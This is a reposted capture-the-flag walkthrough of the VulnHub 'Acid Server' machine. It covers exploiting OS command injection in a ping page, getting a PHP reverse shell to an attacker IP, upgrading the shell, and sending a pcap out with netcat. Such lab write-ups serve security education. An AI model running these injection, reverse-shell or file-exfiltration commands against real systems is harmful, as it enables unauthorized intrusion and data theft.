# :game_die: Medium

> **Original Source:** [Medium](https://infosecwriteups.com/acid-server-vulnhub-ctf-walkthrough-7630ce8eb104)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Out of all directories, the only **command.php** was looking useful. Let’s open it in the browser.


Upon opening, you will find a **ping **portal that means you can ping any IP address from here. Try to ping any IP and confirm the results on the page source.


This shows that there are possibilities for **OS Command Injection** and to be sure let’s run any arbitrary command such as “;**ls”** as shown below.


On the page source, you can confirm the results of **ls **command.


5. As the page title says **“Reverse Kunfu”**, it is the hint towards **Reverse Shell**. So without any delay, run a listener** (nc -nvlp 8000)** on the attacking machine and enter the following command in the page to take the reverse shell.

>

**php -r ‘$sock=fsockopen(“192.168.225.139”,8000);exec(“/bin/sh -i <&3 >&3 2>&3”);’**


Replace the IP and listener port with yours.


We get the shell with ***www-data*** user. Also, this is a non-interactive shell and we need an interactive one. Without interaction, the OS cannot ask for password and su won't work.


6. Run the following command to get the interactive shell.

>

**python -c ‘import pty; pty.spawn(“/bin/bash”)’**


Let’s start checking for files in the system. I found an unusual directory “**s.bin*”*** in the system root. It contains a file “**investigate.php*”*** whose content asks us to behave like an investigator to catch the culprit.


After going into the** /home** directory, I found a local user named “**saman**”. This can be a useful user for us but we don’t have a password to login into it. Let’s try to find the password.


Further looking into the filesystem, I found a directory **“raw_vs_isi”*** *inside **/sbin **directory. It contains a **pcap **file **“hint.pcapng”***.*


7. Transfer this file to your own attacking machine with **netcat**:

>

**On the attacking machine:** nc -lp 1234 > pcap


**On the target machine:** nc 192.168.225.139 1234 < hint.pcapng


After opening this file with Wireshark, I found a conversation in the TCP stream. Just **right-click** on any of these filtered packets and then click on the **Follow** option and then select **TCP stream**.

---

*Originally published on [Medium](https://infosecwriteups.com/acid-server-vulnhub-ctf-walkthrough-7630ce8eb104). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
